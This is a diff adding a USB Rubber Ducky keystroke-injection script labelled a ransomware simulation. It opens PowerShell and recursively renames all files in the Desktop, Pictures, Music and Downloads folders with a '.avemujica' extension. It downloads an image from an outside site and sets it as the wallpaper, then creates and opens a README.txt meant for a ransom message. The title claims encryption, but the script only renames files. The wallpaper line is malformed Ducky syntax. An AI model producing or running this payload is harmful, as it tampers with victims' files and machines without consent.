@@ -1,0 +1,46 @@
+REM %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+REM %%%%%%%%%%%%%              Ransomware Simulation - Encrypt Files (Recursive) Ducky Script                             %%%%%%%%%%%%%%
+REM %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+DELAY 1000
+GUI r
+DELAY 2000
+STRING powershell
+ENTER
+DELAY 6000
+REM Define the locations
+STRING $folders = @(
+ENTER
+STRING [Environment+SpecialFolder]::Desktop,
+ENTER
+STRING [Environment+SpecialFolder]::MyPictures,
+ENTER
+STRING [Environment+SpecialFolder]::MyMusic
+ENTER
+STRING )
+ENTER
+STRING $folders += [Environment]::GetFolderPath('UserProfile') + '\Downloads'
+ENTER
+DELAY 3000
+REM Iterate over each location and recursively rename files
+STRING foreach ($folder in $folders) {
+ENTER
+STRING     if (Test-Path $folder) {
+ENTER
+STRING         Get-ChildItem -Path $folder -File -Recurse | ForEach-Object { Rename-Item -Path $_.FullName -NewName ($_.Name + '.avemujica') }
+ENTER
+STRING     }
+ENTER
+STRING }
+ENTER
+DELAY 4000
+REM Change desktop
+STRING $u='https://img.4gamers.com.tw/puku-clone-version/04f6b840dcd746fca0693ca9c81788f60d318d3c.jpg'; $t="$env:TEMP\wallpaper.jpg"; Invoke-WebRequest -Uri $u -OutFile $t; Add-Type '[DllImport("user32.dll",SetLastError=true)]public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);' -Name Win32 -Namespace Win32Functions; [Win32Functions.Win32]::SystemParametersInfo(20,0,$t,3)
+REM Create a README.txt file on the Desktop with ASCII art and ransom message
+STRING $desktopPath = [System.Environment]::GetFolderPath('Desktop')
+ENTER
+STRING $filePath = "$desktopPath\README.txt"
+ENTER
+STRING New-Item -Path $filePath -ItemType File -Force
+ENTER
+STRING notepad "$filePath"
+ENTER
